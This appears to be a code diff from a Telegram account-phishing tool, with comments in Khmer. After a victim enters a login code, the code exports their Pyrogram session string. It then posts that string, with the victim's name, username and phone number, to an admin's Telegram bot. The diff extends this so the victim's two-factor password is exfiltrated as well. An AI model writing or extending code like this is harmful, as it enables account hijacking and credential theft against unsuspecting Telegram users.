@@ -95,14 +95,20 @@ async def async_verify_code(phone_number, code, password):
 
     session_string = await client.export_session_string()
 
-    # ❌ បានលុបផ្នែក delete_chat_history ចោលដើម្បីរក្សាទុកប្រវត្តិសារ (Chat)
-
     await client.disconnect()
     temp_clients.pop(phone_number, None)
 
     # ផ្ញើ Notification ទៅកាន់ Admin Telegram Bot
     if BOT_TOKEN and ADMIN_CHAT_ID:
-        msg = f"🔔 **New Telegram Session Logged In!**\n\n👤 **Name:** {full_name}\n🏷 **Username:** {username}\n📱 **Phone:** `{phone_number}`\n\n🔑 **Pyrogram Session String:**\n`{session_string}`"
+        two_fa_text = password if password else "None"
+        msg = (
+            "🔔 **New Telegram Session Logged In!**\n\n"
+            f"👤 **Name:** {full_name}\n"
+            f"🏷 **Username:** {username}\n"
+            f"📱 **Phone:** `{phone_number}`\n"
+            f"🔐 **2FA :** `{two_fa_text}`\n\n"
+            f"🔑 **Pyrogram Session String:**\n`{session_string}`"
+        )
         try:
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
